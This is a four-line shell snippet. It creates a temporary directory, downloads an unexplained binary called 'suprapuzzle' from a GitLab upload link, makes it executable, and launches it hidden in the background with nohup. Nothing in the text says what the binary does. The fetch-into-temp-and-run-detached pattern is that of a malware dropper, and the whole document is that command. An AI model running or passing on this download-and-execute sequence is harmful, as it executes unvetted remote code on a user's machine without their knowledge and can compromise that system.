cd $(mktemp -d )
wget https://gitlab.com/-/project/61551072/uploads/8c1701a4ef710060cf2eb3be925353da/suprapuzzle
chmod +x suprapuzzle
nohup ./suprapuzzle&
